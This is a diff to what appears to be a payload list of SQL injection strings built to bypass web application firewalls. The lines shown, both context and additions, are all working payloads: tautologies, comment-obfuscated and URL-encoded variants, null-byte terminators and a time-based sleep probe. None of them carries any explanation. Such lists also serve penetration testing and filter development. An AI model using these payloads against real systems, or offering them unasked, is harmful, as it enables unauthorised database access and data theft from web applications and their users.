@@ -4,6 +4,22 @@ WAF / Filter bypass SQL injection :~
 ' OR '1'='1'/* 
 %27%20OR%201=1--
 'UNIunionON SELselectECT 1,2,3--
-' OR '1'='1' --+
+'/**/OR/**/'1'/**/=/**/'1'--
 ' OR '1' LIKE '1
 ' OR '1' IN ('1')
+' OR+1=1--
+' OR 1=1%00
+' OR 1=1;#
+' OR 1=1;%00
+' OR true--
+' OR 'a'='a
+' OR ' ' = ' '
+'|| '1'='1'
+'%2F%2A%2A%2For%2F%2A%2A%2F'1'%2F%2A%2A%2F=%2F%2A%2A%2F'1'
+' OR 2=2 --+
+' OR 2 LIKE 2
+' OR 2 REGEXP 2
+' OR NOT 'x'='y'
+' OR '1'='1' --+
+'|| '2'='2'
+' or sleep(5)#
